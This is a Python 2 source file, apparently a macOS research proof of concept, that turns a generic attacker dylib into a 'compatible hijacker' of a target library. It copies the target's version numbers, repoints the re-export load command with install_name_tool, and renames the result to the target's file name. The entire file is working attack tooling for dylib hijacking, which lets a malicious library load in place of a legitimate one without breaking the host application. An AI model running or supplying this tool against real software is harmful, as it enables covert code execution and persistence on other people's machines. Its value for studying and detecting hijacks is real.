'''
	CREATE A HIJACKER (v1.0, 3/2015)
	given a generic hijacker dylib and a target dlyib, configure the hijack dylib so that it's a *compatible* hijacker
	1) set version @#'s in custom dylib to match target dylib
	2) set re-export to point to target dylib

	NOTES:
	1) the generic hijacker must contain an existing re-export (LC_REEXPORT_DYLIB)
	2) requires macholib and install_name_tool
	3) this is proof-of-concept code ;)

'''

#TODO: checks
# 	1) arch match
#   2) constructor export
#   3) ...

import io
import os
import sys
import fcntl
import shutil
import struct
import subprocess

#size of load command header
LC_HEADER_SIZE = 0x8

#path to "install name tool"
INSTALL_NAME_TOOL = '/usr/bin/install_name_tool'

#basic sanity/prereqs checks
def checkPrereqs(attackerDYLIB, targetDYLIB):

	#global import
	global macholib

	#make sure attacker .dylib exists
	if not os.path.exists(attackerDYLIB):

		#err msg & bail
		print 'ERROR: dylib \'%s\' not found' % (attackerDYLIB)
		return False

	#make sure target .dylib exists
	if not os.path.exists(targetDYLIB):

		#err msg & bail
		print 'ERROR: dylib \'%s\' not found' % (targetDYLIB)
		return False

	#make sure 'install name tool' exists
	if not os.path.exists(INSTALL_NAME_TOOL):

		#err msg(s) & bail
		print 'ERROR: required utility \'%s\' not found' % (os.path.split(INSTALL_NAME_TOOL)[1])
		print '       (perhaps install XCode?)'
		return False

	#try import macholib
	try:

		#import
		import macholib.MachO

	#handle exception
	# ->bail w/ error msg
	except ImportError:

		#err msg
		print('ERROR: could not load required module (macholib)')
		return False

	return True


#find load command
def findLoadCommand(fileHandle, targetLoadCommand):

	#offset of matches load commands
	matchedOffsets = []

	#wrap
	try:

		#load it as mach-o file
		macho = macholib.MachO.MachO(fileHandle.name)
		if macho:

			#parse all mach-o headers
			for machoHeader in macho.headers:

				#go to header offset
				fileHandle.seek(machoHeader.offset, io.SEEK_SET)

				#skip over headers
				fileHandle.seek(machoHeader.mach_header._size_, io.SEEK_CUR)

				#get load command
				loadCommands = machoHeader.commands

				#iterate of all load commands
				# ->save offset of matches
				for loadCommand in loadCommands:

					#check for match
					if targetLoadCommand == loadCommand[0].cmd:

						#save offset
						matchedOffsets.append(fileHandle.tell())

					#seek to next load command
					fileHandle.seek(loadCommand[0].cmdsize, io.SEEK_CUR)
	#exceptions
	except Exception, e:

		#err msg
		print 'EXCEPTION (finding load commands): %s' % e

		#reset
		matchedOffsets = None

	return matchedOffsets

#configure version info
#  1) find/extract version info from target .dylib
#  2) find/update version info from hijacker .dylib to match target .dylib
def configureVersions(attackerDYLIB, targetDYLIB):

	#wrap
	try:

		#dbg msg
		print ' [+] parsing \'%s\' to extract version info' % (os.path.split(targetDYLIB)[1])

		#open target .dylib
		fileHandle = open(targetDYLIB, 'rb')

		#find LC_ID_DYLIB load command
		# ->and check
		versionOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_ID_DYLIB)
		if not versionOffsets or not len(versionOffsets):

			#err msg
			print 'ERROR: failed to find \'LC_ID_DYLIB\' load command in %s' % (os.path.split(targetDYLIB)[1])

			#bail
			return False

		#dbg msg
		print '     found \'LC_ID_DYLIB\' load command at offset(s): %s' % (versionOffsets)

		#seek to offset of LC_ID_DYLIB
		fileHandle.seek(versionOffsets[0], io.SEEK_SET)

		#seek to skip over LC header and timestamp
		fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

		'''
		struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
		'''

		#extract current version
		currentVersion = fileHandle.read(4)

		#extract compatibility version
		compatibilityVersion = fileHandle.read(4)

		#dbg msg(s)
		print '     extracted current version: 0x%x' % (struct.unpack('<L', currentVersion)[0])
		print '     extracted compatibility version: 0x%x' % (struct.unpack('<L', compatibilityVersion)[0])

		#close
		fileHandle.close()

		#dbg msg
		print ' [+] parsing \'%s\' to find version info' % (os.path.split(attackerDYLIB)[1])

		#open target .dylib
		fileHandle = open(attackerDYLIB, 'rb+')

		#find LC_ID_DYLIB load command
		# ->and check
		versionOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_ID_DYLIB)
		if not versionOffsets or not len(versionOffsets):

			#err msg
			print 'ERROR: failed to find \'LC_ID_DYLIB\' load command in %s' % (os.path.split(attackerDYLIB)[1])

			#bail
			return False

		#dbg msg(s)
		print '     found \'LC_ID_DYLIB\' load command at offset(s): %s' % (versionOffsets)
		print ' [+] updating version info in %s to match %s' % ((os.path.split(attackerDYLIB)[1]), (os.path.split(targetDYLIB)[1]))

		#update version info
		for versionOffset in versionOffsets:

			#seek to offset of LC_ID_DYLIB
			fileHandle.seek(versionOffset, io.SEEK_SET)

			#seek to skip over LC header and timestamp
			fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

			#dbg msg
			print '     setting version info at offset %s' % (versionOffset)

			#set current version
			fileHandle.write(currentVersion)

			#set compatability version
			fileHandle.write(compatibilityVersion)

		#close
		fileHandle.close()

	except Exception, e:

		#err msg
		print 'EXCEPTION (configuring version info): %s' % e


	return True

#configure re-export
# ->update hijacker .dylib to re-export everything to target .dylib
def configureReExport(attackerDYLIB, targetDYLIB):

	#wrap
	try:

		#dbg msg
		print ' [+] parsing \'%s\' to extract faux re-export info' % (os.path.split(attackerDYLIB)[1])

		#open attacker's .dylib
		fileHandle = open(attackerDYLIB, 'rb')

		#find LC_REEXPORT_DYLIB load command
		# ->and check
		reExportOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_REEXPORT_DYLIB)
		if not reExportOffsets or not len(reExportOffsets):

			#err msg
			print 'ERROR: failed to find \'LC_REEXPORT_DYLIB\' load command in %s' % (os.path.split(attackerDYLIB)[1])

			#bail
			return False

		#dbg msg
		print '     found \'LC_REEXPORT_DYLIB\' load command at offset(s): %s' % (reExportOffsets)

		'''
		struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
		'''

		#update re-export info
		#TODO: does the current and compat version need to match? we can easily set it
		for reExportOffset in reExportOffsets:

			#seek to offset of LC_REEXPORT_DYLIB
			fileHandle.seek(reExportOffset, io.SEEK_SET)

			#seek to skip over command
			fileHandle.seek(0x4, io.SEEK_CUR)

			#read in size of load command
			commandSize = struct.unpack('<L', fileHandle.read(4))[0]

			#dbg msg
			print '     extracted LC command size: 0x%x' % (commandSize)

			#read in path offset
			pathOffset = struct.unpack('<L', fileHandle.read(4))[0]

			#dbg msg
			print '     extracted path offset: 0x%x' % (pathOffset)

			#seek to path offset
			fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)

			#calc length of path
			# it makes up rest of load command data
			pathSize = commandSize - (fileHandle.tell() - reExportOffset)

			#dbg msg
			print '     computed path size: 0x%x' % (pathSize)

			#read out path
			path = fileHandle.read(pathSize)

			#path can include NULLs so lets chop those off
			path = path.rstrip('\0')

			#dbg msg(s)
			print '     extracted faux path: %s' % (path)

			#close
			fileHandle.close()

			#dbg msg
			print ' [+] updating embedded re-export via exec\'ing: %s %s' % (INSTALL_NAME_TOOL, '-change')

			#wrap
			try:

				#invoke install_name_tool to update the re-export info
				subprocess.check_call([INSTALL_NAME_TOOL, '-change', path, targetDYLIB, attackerDYLIB])

			#handle exceptions
			except Exception, e:

				#err msg
				print 'ERROR: %s threw exception %s' % (INSTALL_NAME_TOOL, e)

				#bail
				return False

	#handle exceptions
	except Exception, e:

		#err msg
		print 'EXCEPTION (configuring re-exports): %s' % e

		#bail
		return False

	return True

#configure
# ->set version's
# ->re-export
def configure(attackerDYLIB, targetDYLIB):

	#configure version info
	# ->update attacker's .dylib to match target .dylib's version info
	if not configureVersions(attackerDYLIB, targetDYLIB):

		#err msg
		print 'ERROR: failed to configure version info'

		#bail
		return False

	#configure re-export
	# ->update attacker's .dylib to re-export everything to target .dylib
	if not configureReExport(attackerDYLIB, targetDYLIB):

		#err msg
		print 'ERROR: failed to configure re-export'

		#bail
		return False

	return True

#main interface
if __name__ == '__main__':

	#attacker .dylib
	attackerDYLIB = ""

	#target .dylib
	targetDYLIB = ""

	#configured .dylib
	configuredDYLIB = ""

	#dbg msg(s)
	print '\nCREATE A HIJACKER (p. wardle)'
	print 'configures an attacker supplied .dylib to be compatible with a target hijackable .dylib\n'

	#check args
	if len(sys.argv) != 3:

		#err msg(s)
		print 'ERROR: invalid usage'
		print '       <hijacker dylib> <target dylib>\n'

		#bail
		sys.exit(-1)

	#extract arg
	# ->attacker .dylib is first arg
	attackerDYLIB = os.path.abspath(sys.argv[1])

	#extract arg
	# ->target .dylib is second arg
	targetDYLIB = os.path.abspath(sys.argv[2])

	#init output path for configured .dylib
	configuredDYLIB = os.path.split(attackerDYLIB)[0]+'/' + os.path.split(targetDYLIB)[1]

	#dbg msg
	print ' [+] configuring %s to hijack %s' % (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1])

	#check prereqs
	# ->i.e. sanity checks
	if not checkPrereqs(attackerDYLIB, targetDYLIB):

		#err msg
		print 'ERROR: prerequisite check failed\n'

		#bail
		sys.exit(-1)

	#configure the provide .dylib
	if not configure(attackerDYLIB, targetDYLIB):

		#err msg
		print 'ERROR: failed to configure %s\n' % (os.path.split(targetDYLIB)[1])

		#bail
		sys.exit(-1)

	#dbg msg
	print ' [+] copying configured .dylib to %s' % (configuredDYLIB)

	#make a (local) copy w/ name
	shutil.copy2(attackerDYLIB, configuredDYLIB)

	#dbg msg
	print '\nsuccessfully configured %s (locally renamed to: %s) as a compatible hijacker for %s!\n' % (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1], os.path.split(targetDYLIB)[1])